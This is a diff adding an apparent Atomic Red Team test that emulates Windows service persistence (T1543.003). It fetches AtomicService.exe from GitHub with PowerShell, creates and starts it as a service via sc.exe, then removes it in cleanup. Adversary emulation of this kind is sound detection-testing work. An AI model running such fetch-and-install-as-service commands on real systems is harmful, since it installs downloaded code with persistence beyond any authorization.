@@ -1,0 +1,19 @@
+#TechniqueName: Create or Modify System Process: Windows Service
+#AtomicTestName: Service Installation CMD
+#Description: Download an executable from github and start it as a service.&Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.&
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1543.003\bin\AtomicService.exe) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe"
+
+
+#commands
+sc.exe create AtomicTestService_CMD binPath= PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+sc.exe start AtomicTestService_CMD
+
+
+#cleanup_commands
+sc.exe stop AtomicTestService_CMD >nul 2>&1
+sc.exe delete AtomicTestService_CMD >nul 2>&1
+
